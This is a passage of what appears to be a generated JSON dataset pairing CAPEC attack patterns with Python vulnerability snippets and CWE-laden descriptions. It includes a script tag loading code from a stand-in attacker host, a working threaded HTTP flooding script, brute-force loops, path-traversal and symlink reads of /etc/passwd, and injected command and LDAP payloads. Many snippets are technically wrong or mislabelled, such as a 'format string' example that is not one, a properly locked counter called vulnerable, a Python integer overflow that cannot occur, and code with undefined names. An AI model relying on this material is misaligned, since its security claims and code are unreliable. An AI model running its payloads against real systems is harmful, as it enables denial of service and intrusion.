        "code_snippet": "import json\n\n# Vulnerable code snippet\n\ndef get_confidential_info(user_id):\n    # CWE-345: Insufficient Verification of Data Authenticity\n    # CWE-346: Origin Validation Error\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    # CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    user_data = {'user_id': user_id, 'confidential_info': 'secret_data'}\n    return json.dumps(user_data)\n\n# Attacker's malicious script\n\ndef steal_confidential_info():\n    # Include malicious script in the context of another website\n    script_tag = '<script src=\"http://attacker-website.com/malicious_script.js\"></script>'\n    return script_tag\n\n# Server-side code\n\ndef server_response():\n    user_id = 'user123'\n    confidential_info = get_confidential_info(user_id)\n    return '<html><body>' + steal_confidential_info() + '<script>var data = ' + confidential_info + '; console.log(data);</script></body></html>'",
        "description": "This code snippet demonstrates a vulnerable JSON-based web application that is susceptible to a JSON hijacking attack. The server-side code returns confidential information in a JSON object, which can be stolen by an attacker's malicious script due to insufficient verification of data authenticity, origin validation errors, and lack of CSRF protection. The malicious script can be included in the context of another website, allowing the attacker to steal the confidential information."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import hashlib\nimport itertools\nimport string\n\n# Weak password requirements (CWE-521)\npassword_length = 4\n\n# Insufficiently random values (CWE-330)\nrandom_salt = ''.join(random.choice(string.digits) for _ in range(2))\n\n# Inadequate encryption strength (CWE-326)\nhash_function = hashlib.md5\n\n# Weak authentication (CWE-1390)\ndef authenticate(username, password):\n    hashed_password = hash_function((password + random_salt).encode()).hexdigest()\n    return hashed_password == stored_password\n\n# Improper restriction of excessive authentication attempts (CWE-307)\nfor attempt in itertools.product(string.printable, repeat=password_length):\n    password_attempt = ''.join(attempt)\n    if authenticate('user', password_attempt):\n        print('Brute force successful! Password is:', password_attempt)\n        break",
        "description": "This code snippet demonstrates a brute force attack on a weak password system. The system uses a weak password requirement of only 4 characters, and the password is hashed with a weak salt and the MD5 hash function. The authentication function does not implement sufficient measures to prevent multiple failed authentication attempts, making it susceptible to brute force attacks. The attacker uses the itertools module to generate all possible passwords of the required length and attempts to authenticate with each one."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\nSOC_COMPONENT_ID = 0x1234\n\n# CWE-1262: Improper Access Control for Register Interface\nREGISTER_ADDRESS = 0x5678\nREGISTER_PERMISSION = 0\n\n# CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nALTERNATE_REGISTER_ADDRESS = 0x9012\n\n# CWE-782: Exposed IOCTL with Insufficient Access Control\nIOCTL_CODE = 0x1111\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\ndef activate_debug_logic():\n    # Activate test/debug logic\n    ctypes.windll.kernel32.DebugBreak()\n\n# Interface manipulation\ndef manipulate_interface():\n    # Force the unexpected use of an interface or the use of an interface in an unintended way\n    ctypes.windll.kernel32.DeviceIoControl(IOCTL_CODE, 0, None, 0, None, 0, None, None)\n    # Access the register interface without proper permission\n    ctypes.windll.kernel32.WriteProcessMemory(REGISTER_ADDRESS, REGISTER_PERMISSION, 0x1234)\n    # Use the alternate hardware interface to bypass access control\n    ctypes.windll.kernel32.WriteProcessMemory(ALTERNATE_REGISTER_ADDRESS, 0, 0x5678)\n    # Activate test/debug logic at runtime\n    activate_debug_logic()\n\nmanipulate_interface()",
        "description": "This code snippet demonstrates the CAPEC of interface manipulation, which can lead to adverse security impacts. It includes examples of CWE-1192, CWE-1262, CWE-1299, CWE-782, and CWE-1313, showcasing how an adversary can manipulate the use or processing of an interface to bypass access control and execute unintended functionality."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-287: Improper Authentication\n    # No password hashing or salting, using plaintext passwords\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n# CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State\n# Debug mode allows access to internal assets without authentication\nif __debug__:\n    def access_internal_asset():\n        # Internal asset exposed to untrusted debug agents\n        return 'Internal asset accessed'\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# No rate limiting or IP blocking for failed authentication attempts\nattempts = 0\nwhile attempts < 100:\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if authenticate(username, password):\n        print('Authenticated successfully')\n        break\n    else:\n        attempts += 1\n        print('Invalid credentials. Try again.')\n\n# CWE-305: Authentication Bypass by Primary Weakness\n# Authentication can be bypassed by exploiting a separate weakness\n# In this case, a hardcoded secret key can be used to bypass authentication\nsecret_key = 'hardcoded_secret_key'\nif input('Enter secret key: ') == secret_key:\n    print('Authenticated successfully (bypassed)')\n\n# CWE-1390: Weak Authentication\n# Weak password hashing algorithm (MD5) used\npassword_hash = hashlib.md5('password123'.encode()).hexdigest()\nif input('Enter password: ') == password_hash:\n    print('Authenticated successfully (weak auth)')",
        "description": "This code snippet demonstrates the CAPEC of exploiting weaknesses in authentication mechanisms. It includes multiple CWEs, such as improper authentication, exposed internal assets, lack of rate limiting, authentication bypass, and weak authentication. The code uses plaintext passwords, allows access to internal assets in debug mode, lacks rate limiting for failed authentication attempts, and uses weak password hashing. It also demonstrates authentication bypass using a hardcoded secret key and weak authentication using MD5 hashing."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    elif username == 'user' and password == 'password123':\n        return True\n    else:\n        # Authentication bypass using an alternate path or channel (CWE-288)\n        if username.startswith('guest_') and password == 'guest':\n            return True\n        else:\n            # Weak authentication (CWE-1390)\n            hashed_password = hashlib.md5(password.encode()).hexdigest()\n            if hashed_password == '5f4dcc3b5aa765d61d8327deb882cf99':\n                return True\n            else:\n                return False\n\n# Improper authentication (CWE-287)\n# Authentication bypass by assumed-immutable data (CWE-302)\n# Authentication bypass by primary weakness (CWE-305)\ndef main():\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if authenticate(username, password):\n        print('Authenticated successfully!')\n    else:\n        print('Authentication failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed using various techniques. The authenticate function has multiple weaknesses, including hardcoded credentials, weak password hashing, and an alternate path for guest users. An attacker can exploit these weaknesses to gain unauthorized access to the system."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_info = {'username': 'admin', 'password': 'password'}\n\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\ndebug_mode = True\nif debug_mode:\n    print('Debug Mode: Sensitive Information Exposed:', sensitive_info)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    malicious_code = 'malicious_code.exe'\n    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket_obj.connect(('localhost', 8080))\n    socket_obj.send(malicious_code.encode())\n    socket_obj.close()\n\n# CWE-426: Untrusted Search Path\nuntrusted_search_path = 'C:\\untrusted_path'\nos.environ['PATH'] = untrusted_search_path\n\n# CWE-1229: Creation of Emergent Resource\ndef create_emergent_resource():\n    emergent_resource = 'emergent_resource.exe'\n    with open(emergent_resource, 'w') as f:\n        f.write('malicious_code')\n    os.system(emergent_resource)\n\n# CAPEC: Probing the target to solicit information\nprobe_target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprobe_target.connect(('localhost', 8080))\nprobe_target.send('Probe Target'.encode())\nresponse = probe_target.recv(1024).decode()\nprint('Probe Response:', response)\n",
        "description": "This Python code snippet demonstrates the CAPEC of probing the target to solicit information. It includes CWE-200 by exposing sensitive information, CWE-1243 by not protecting sensitive information during debug, CWE-509 by replicating malicious code, CWE-426 by using an untrusted search path, and CWE-1229 by creating an emergent resource. The code probes the target by sending a probe request and prints the response."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\nimport json\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint('Server started. Listening for incoming connections...')\n\n# Accept an incoming connection\nconnection, address = server_socket.accept()\n\nprint('Connected by', address)\n\n# Receive data from the client\nwhile True:\n    data = connection.recv(1024)\n    if not data:\n        break\n    print('Received from client:', data.decode())\n    # CWE-514: Covert Channel - Send sensitive information in cleartext\n    sensitive_info = {'username': 'admin', 'password': 'password123'}\n    connection.sendall(json.dumps(sensitive_info).encode())\n\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# Send a large amount of data to the client\nfor i in range(10000):\n    connection.sendall(b'A' * 1024)\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# Send a malformed HTTP request\nconnection.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n\nconnection.close()",
        "description": "This Python code snippet demonstrates a server that accepts incoming connections and transmits sensitive information in cleartext, violating CWE-319. It also fails to ensure message integrity during transmission, as described in CWE-924. The server sends a large amount of data to the client, potentially leading to network amplification (CWE-406). Additionally, it sends a malformed HTTP request, which may be interpreted inconsistently by the client (CWE-444). Finally, the server transmits sensitive information through a covert channel (CWE-514). An adversary can monitor the data streams to gather sensitive information or support further attacks."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\nurl = 'http://example.com/../../etc/passwd'\nencoded_url = urllib.parse.quote(url)\ndouble_encoded_url = urllib.parse.quote(encoded_url)\nprint(double_encoded_url)\n\n# The output will be: http%3A%2F%2Fexample.com%2F%25%2E%25%2E%2F%25%2E%25%2E%2Fetc%2Fpasswd\n\n# This double encoded URL may bypass filters that attempt to detect illegal characters or strings.",
        "description": "This code snippet demonstrates the CAPEC of double encoding to bypass filters. It takes a URL with traversal characters, encodes it once using URL encoding, and then encodes it again. The resulting double encoded URL may be able to evade filters that detect illegal characters or strings, but can still be interpreted correctly by the target system. This code relates to CWEs 173, 172, 177, 181, 183, 184, 74, 20, 697, and 692, which describe various weaknesses in handling encoding, validation, and filtering of user input."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\ndef debug_mode():\n    if os.environ.get('DEBUG') == 'True':\n        # Enable debug mode\n        return True\n    else:\n        return False\n\n# Debug interface unintentionally enabled on production system\nif debug_mode():\n    # CWE-489: Active Debug Code\n    print('Debug mode enabled')\n    # CWE-1295: Debug Messages Revealing Unnecessary Information\n    print('System information: ', os.uname())\n    # CWE-1296: Incorrect Chaining or Granularity of Debug Components\n    debug_components = ['component1', 'component2']\n    for component in debug_components:\n        print(f'Debug component: {component}')\n    # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n    transaction = {'source_id': None, 'data': 'sensitive_data'}\n    print('Transaction: ', transaction)\n    # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    hardware_state = 'active'\n    if hardware_state == 'active':\n        print('Hardware state: Active')\n        # Altering the state of the hardware\n        hardware_state = 'inactive'\n        print('Hardware state: Inactive')",
        "description": "This code snippet demonstrates the CAPEC of an adversary exploiting a sample, demonstration, test, or debug interface that is unintentionally enabled on a production system. The code includes various CWEs, such as active debug code, debug messages revealing unnecessary information, incorrect chaining or granularity of debug components, missing source identifier in entity transactions, and hardware allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class SensitiveResource:\n    def __init__(self):\n        self.sensitive_data = 'confidential information'\n\n    def access_resource(self, user):\n        # CWE-269: Improper Privilege Management\n        # CWE-732: Incorrect Permission Assignment for Critical Resource\n        # CWE-284: Improper Access Control\n        if user == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access denied'\n\n    def modify_resource(self, user, new_data):\n        # CWE-1317: Improper Access Control in Fabric Bridge\n        # CWE-653: Improper Isolation or Compartmentalization\n        if user == 'admin':\n            self.sensitive_data = new_data\n            return 'Resource modified successfully'\n        else:\n            return 'Access denied'\n\nresource = SensitiveResource()\nprint(resource.access_resource('user'))  # Should print 'Access denied'\nprint(resource.modify_resource('user', 'new data'))  # Should print 'Access denied'\nprint(resource.access_resource('admin'))  # Should print 'confidential information'\nprint(resource.modify_resource('admin', 'new data'))  # Should print 'Resource modified successfully'",
        "description": "This code snippet demonstrates the CAPEC of exploiting features reserved for privileged users or administrators but exposed to lower or non-privileged accounts. The SensitiveResource class has methods for accessing and modifying sensitive data, but the access control checks are inadequate, allowing unauthorized users to access or modify the resource."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(buffer_size, input_data):\n    buffer = [0] * buffer_size\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]\n    return buffer\n\nbuffer_size = 10\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\nvulnerable_function(buffer_size, input_data)",
        "description": "This code snippet demonstrates a buffer overflow vulnerability. The function `vulnerable_function` allocates a buffer of a fixed size and then copies user-provided input data into the buffer without checking the size of the input data. If the input data is larger than the buffer size, it will overflow the buffer and potentially overwrite adjacent memory locations, leading to unexpected behavior or even code execution."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\nclass SharedResource:\n    def __init__(self):\n        self.value = 0\n        self.lock = threading.Lock()\n\n    def increment(self):\n        with self.lock:\n            self.value += 1\n\n    def get_value(self):\n        return self.value\n\n\nresource = SharedResource()\n\ndef thread_func(resource):\n    for _ in range(100000):\n        resource.increment()\n\nthreads = []\nfor _ in range(10):\n    t = threading.Thread(target=thread_func, args=(resource,))\n    t.start()\n    threads.append(t)\n\nfor t in threads:\n    t.join()\n\nprint(resource.get_value())",
        "description": "This code snippet demonstrates the CAPEC of exploiting a shared resource between multiple threads. The CWEs 662, 1189, 1331, 1303, and 1421 are related to this CAPEC. The code creates a shared resource with a lock to synchronize access. However, if an adversary can manipulate the shared resource, the other threads will continue to trust the validity of the compromised shared resource, leading to invalid trust assumptions or corruption of additional data."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import socket\nimport threading\nimport time\n\n\ndef flood_target(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    while True:\n        sock.send(b'GET / HTTP/1.1\\r\\nHost: ' + ip.encode() + b'\\r\\n\\r\\n')\n        time.sleep(0.01)\n\n\ndef main():\n    ip = '192.168.1.100'\n    port = 80\n    threads = []\n    for _ in range(1000):\n        t = threading.Thread(target=flood_target, args=(ip, port))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a flooding attack by rapidly sending a large number of HTTP requests to a target IP and port, exhausting its resources and preventing legitimate users from accessing the service. The code creates 1000 threads, each sending requests at a rate of 100 requests per second, without any rate limiting or throttling, exemplifying CWE-770 and CWE-400. The lack of resource control and insufficient resource pool (CWE-410) makes the target vulnerable to this type of attack. The code also ignores proper resource shutdown and release (CWE-404), making it prone to resource depletion."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef get_file(file_path):\n    return open(os.path.join('/var/www/html', file_path), 'r').read()\n\nfile_path = '../etc/passwd'\nprint(get_file(file_path))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `get_file` function takes a file path as input and returns the contents of the file. The file path is joined with a restricted directory `/var/www/html` using `os.path.join`. However, the function does not properly validate the input file path, allowing an attacker to traverse out of the restricted directory by providing a path like `../etc/passwd`. This can lead to unauthorized access to sensitive files."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\n\n# CWE-424: Improper Protection of Alternate Path\n# CWE-425: Direct Request ('Forced Browsing')\ndef list_directory_contents(path):\n    if os.path.isdir(path):\n        return {'files': os.listdir(path)}\n    else:\n        return {'error': 'Path is not a directory'}\n\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\n# CWE-285: Improper Authorization\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-276: Incorrect Default Permissions\n# CWE-693: Protection Mechanism Failure\n\npath = '/var/www/html/'\nprint(list_directory_contents(path))",
        "description": "This Python code snippet demonstrates the CAPEC of listing directory contents by crafting a request to a target that results in the target listing/indexing the content of a directory as output. The code uses the os module to check if the provided path is a directory and returns a list of files in that directory. The code does not perform any authentication or authorization checks, allowing an adversary to explore the directory tree and learn the names of files, which can be used to mount additional attacks."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def process_user_input(user_id):\n    if user_id > 0 and user_id <= 100:\n        return user_id * 2\n    else:\n        return -1\n\nuser_id = 2**31 - 1\nprint(process_user_input(user_id))",
        "description": "This code snippet demonstrates the CAPEC of exploiting integer structure to cause unexpected values. The CWEs involved are CWE-190 (Integer Overflow or Wraparound), CWE-194 (Unexpected Sign Extension), and CWE-192 (Integer Coercion Error). The function process_user_input is intended to return the double of the user_id if it is within the range of 1 to 100. However, when the user_id is the maximum positive integer (2^31 - 1), adding 1 to it causes an integer overflow, resulting in a negative number. This negative number is then multiplied by 2, which may lead to unexpected behavior in the application."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "def vulnerable_function(buffer_size, offset):\n    buffer = [0] * buffer_size\n    pointer = buffer\n    pointer += offset\n    try:\n        value = pointer[0]\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\nvulnerable_function(10, 15)\n\n# CWE-823: Use of Out-of-range Pointer Offset\nvulnerable_function(10, -5)\n\n# CWE-476: NULL Pointer Dereference\nvulnerable_function(0, 0)\n\n# CWE-822: Untrusted Pointer Dereference\nuser_input = input(\"Enter an offset: \")\nvulnerable_function(10, int(user_input))\n\n# CWE-682: Incorrect Calculation\nvulnerable_function(10, buffer_size * 2)",
        "description": "This Python code snippet demonstrates the CAPEC 'Pointer Manipulation' attack pattern, which involves manipulating a pointer to access unintended memory locations. The code includes examples of CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-823 (Use of Out-of-range Pointer Offset), CWE-476 (NULL Pointer Dereference), CWE-822 (Untrusted Pointer Dereference), and CWE-682 (Incorrect Calculation)."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import os\n\ndef allocate_excessive_resources(user_input):\n    # CWE-770: Allocation of Resources Without Limits or Throttling\n    # CWE-1325: Improperly Controlled Sequential Memory Allocation\n    memory_allocation = {}\n    for i in range(int(user_input)):\n        memory_allocation[i] = os.urandom(1024*1024)  # Allocate 1MB of memory\n\n    # CWE-400: Uncontrolled Resource Consumption\n    # CWE-410: Insufficient Resource Pool\n    while True:\n        try:\n            # CWE-404: Improper Resource Shutdown or Release\n            # Simulate a resource-intensive task\n            result = [i**2 for i in range(10**6)]\n        except MemoryError:\n            print(\"MemoryError: Unable to allocate sufficient memory\")\n            break\n\n# Example usage\nallocate_excessive_resources(input(\"Enter a large number: \"))",
        "description": "This Python code snippet demonstrates a vulnerable function that allocates excessive resources based on user input. It uses a loop to allocate large chunks of memory without any limits or throttling, leading to uncontrolled resource consumption. The function also simulates a resource-intensive task that can cause the program to crash due to insufficient resources. The code does not properly release resources, leading to improper resource shutdown or release. An attacker can exploit this vulnerability by providing a large input, causing the program to allocate excessive resources and leading to a denial-of-service attack."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import socket\n\ndef create_socket():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    return s\n\nfor i in range(10000):\n    s = create_socket()\n    # Do something with the socket\n    # But never close it, causing a resource leak\n\n# The program will continue to consume system resources\n# even though the sockets are no longer needed\n",
        "description": "This code snippet demonstrates a resource leak by creating 10,000 socket objects but never closing them, causing the program to consume system resources indefinitely. This is an example of CWE-404: Improper Resource Shutdown or Release, CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak'), CWE-1229: Creation of Emergent Resource, CWE-826: Premature Release of Resource During Expected Lifetime, and CWE-772: Missing Release of Resource after Effective Lifetime."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\n\ndef vulnerable_function(temp_dir, file_name):\n    temp_file_path = os.path.join(temp_dir, file_name)\n    if os.path.exists(temp_file_path):\n        with open(temp_file_path, 'r') as f:\n            content = f.read()\n            print(content)\n    else:\n        print('File does not exist')\n\n# An attacker can create a symbolic link to a sensitive file\nos.symlink('/etc/passwd', 'link_to_passwd')\n\nvulnerable_function('/tmp', 'link_to_passwd')",
        "description": "This code snippet demonstrates a vulnerable function that opens a file based on user input. An attacker can create a symbolic link to a sensitive file, and the function will follow the link, allowing the attacker to access unauthorized files."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--debug', action='store_true', help='Enable debug mode')\nparser.add_argument('--admin', action='store_true', help='Enable admin mode')\nparser.add_argument('--secret', action='store_true', help='Display secret information')\n\nargs = parser.parse_args()\n\nif args.debug:\n    print('Debug mode enabled. Displaying internal variables...')\n    print('Internal variable 1:', internal_var1)\n    print('Internal variable 2:', internal_var2)\n\nif args.admin:\n    print('Admin mode enabled. Granting elevated privileges...')\n    # Grant elevated privileges\n\nif args.secret:\n    print('Secret information:', secret_info)\n\ntry:\n    # Perform some operation that may raise an exception\n    result = perform_operation()\n    print('Operation result:', result)\nexcept Exception as e:\n    # Ignore the exception and continue execution\n    pass\n",
        "description": "This code snippet demonstrates the CAPEC of attempting to invoke all common switches and options in a target application to discover weaknesses. The code includes several command-line arguments, including --debug, --admin, and --secret, which can be used to enable debug mode, grant elevated privileges, and display secret information, respectively. The code also includes an example of ignoring exceptions, which can lead to unexpected behavior. The CWEs embodied in this code snippet include CWE-912 (Hidden Functionality), CWE-184 (Incomplete List of Disallowed Inputs), CWE-391 (Unchecked Error Condition), CWE-1296 (Incorrect Chaining or Granularity of Debug Components), and CWE-1054 (Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\n\n\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n\ndef send_email(subject, message, from_addr, to_addr):\n    msg = MIMEMultipart()\n    msg['Subject'] = subject\n    msg['From'] = from_addr\n    msg['To'] = to_addr\n\n    body = message\n    msg.attach(MIMEText(body, 'plain'))\n\n    server = smtplib.SMTP('smtp.example.com', 587)\n    server.starttls()\n    server.login('username', 'password')\n    text = msg.as_string()\n    server.sendmail(from_addr, to_addr, text)\n\nsubject = 'Test Email'\nmessage = 'Hello,\\r\\nthis is a test email.\\r\\n' + 'Injected Header: ' + 'Injected-Header:Injected-Value\\r\\n' + 'Injected Command: ' + '&&ping -c 1 127.0.0.1\\r\\n'\nfrom_addr = 'from@example.com'\nto_addr = 'to@example.com'\n\nsend_email(subject, message, from_addr, to_addr)",
        "description": "This Python code snippet demonstrates email header injection and command injection vulnerabilities. The 'message' variable contains a crafted email body with injected headers and a command. The email is sent using the 'send_email' function, which does not properly neutralize the injected characters, allowing an attacker to manipulate the email headers and inject malicious commands."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "user_input = input(\"Enter your name: \")\nprint(\"Hello, %s!\" % user_input)\n",
        "description": "This Python code snippet is vulnerable to format string injection. It takes user input and uses it as a format string in the printf function, which can lead to reading or writing to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\ndef authenticate(username):\n    ldap_filter = \"(uid=\" + username + \")\"\n    conn = ldap.initialize('ldap://localhost:389')\n    conn.simple_bind_s('cn=admin,dc=example,dc=com', 'password')\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_filter)\n    return result\n\nusername = input('Enter your username: ')\nresult = authenticate(username)\nprint(result)\n",
        "description": "This Python code snippet demonstrates an LDAP injection vulnerability. The `authenticate` function constructs an LDAP query using user input without proper validation or sanitization, allowing an attacker to inject malicious LDAP commands. For example, an attacker could enter a username like `*` or `)(uid=*))(|(uid=*` to retrieve information about all users or manipulate the LDAP query."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import requests\n\ndef make_request(user_input):\n    url = \"https://example.com/search?q=\" + user_input\n    response = requests.get(url)\n    return response.text\n\nuser_input = \"myInput&new_param=myValue\"\nprint(make_request(user_input))",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary manipulates the content of request parameters to undermine the security of the target. The user_input is directly fed into an HTTP GET request without proper encoding or escaping, allowing an attacker to inject special characters used in the encoding scheme to add or modify parameters. This can significantly change the meaning of the query that is processed by the server."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import os\n\ndef execute_class(class_name, method_name, params):\n    module_name, class_name = class_name.rsplit('.', 1)\n    module = __import__(module_name)\n    class_obj = getattr(module, class_name)\n    instance = class_obj()\n    method = getattr(instance, method_name)\n    method(*params)\n\n# Vulnerable code\nuser_input = input('Enter class name, method name, and parameters (separated by commas): ')\nclass_name, method_name, *params = user_input.split(',')\nexecute_class(class_name, method_name, params)",
        "description": "This Python code snippet demonstrates the CAPEC of using externally-controlled input to select classes or code ('Unsafe Reflection'). The 'execute_class' function uses user input to dynamically load a class, create an instance, and invoke a method with provided parameters. An attacker can exploit this by providing malicious class names, method names, or parameters, leading to code injection, command injection, or reflection attacks."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(os.path.join('/var/www/html', file_path)).read()\n\nfile_path = '../etc/passwd'\nprint(read_file(file_path))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `read_file` function takes a `file_path` as input and reads the file at the joined path. However, the input validation is weak, allowing an attacker to traverse to parent directories using `../` sequences, potentially accessing arbitrary files or resources outside of the intended directory."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n# CWE-472: External Control of Assumed-Immutable Web Parameter\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if flask.request.method == 'POST':\n        # Assume form1 is complete, proceed to form2\n        return flask.redirect('/form2')\n    return '<form action=\"/form1\" method=\"post\"><input type=\"hidden\" name=\"step\" value=\"1\"><input type=\"submit\" value=\"Next\"></form>'\n\n# CWE-372: Incomplete Internal State Distinction\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if flask.request.method == 'POST':\n        # Assume form2 is complete, proceed to form3\n        return flask.redirect('/form3')\n    # No validation of previous form steps\n    return '<form action=\"/form2\" method=\"post\"><input type=\"hidden\" name=\"step\" value=\"2\"><input type=\"submit\" value=\"Next\"></form>'\n\n# CWE-639: Authorization Bypass Through User-Controlled Key\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if flask.request.method == 'POST':\n        # Assume user has access to this form\n        return 'Form 3 submitted successfully'\n    # No authorization check\n    return '<form action=\"/form3\" method=\"post\"><input type=\"hidden\" name=\"user_id\" value=\"\"><input type=\"submit\" value=\"Submit\"></form>'\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_id = flask.request.form['user_id']\n    # No input validation, assume user_id is valid\n    return 'Data submitted for user {}'.format(user_id)\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/csrf', methods=['GET', 'POST'])\ndef csrf():\n    if flask.request.method == 'POST':\n        # No CSRF token validation\n        return 'CSRF vulnerability exploited'\n    return '<form action=\"/csrf\" method=\"post\"><input type=\"submit\" value=\"Exploit CSRF\"></form>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable web application that collects user information through a sequence of forms. An attacker can bypass the form sequence by directly accessing a later form, resulting in incomplete or incorrect information collection. The code also includes vulnerabilities related to external control of assumed-immutable web parameters, incomplete internal state distinction, authorization bypass through user-controlled keys, reliance on untrusted inputs in security decisions, and cross-site request forgery."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\ncache = {}\n\ndef get_data(url):\n    if url in cache:\n        return cache[url]\n    else:\n        response = requests.get(url)\n        cache[url] = response.text\n        return response.text\n\ndef update_cache(url, data):\n    cache[url] = data\n\n# Attacker controlled input\nattacker_url = 'http://attacker.com/malicious_data'\nattacker_data = '<script>malicious_script()</script>'\n\nupdate_cache('https://example.com/data', attacker_data)\n\n# Victim's request\nvictim_url = 'https://example.com/data'\nprint(get_data(victim_url))",
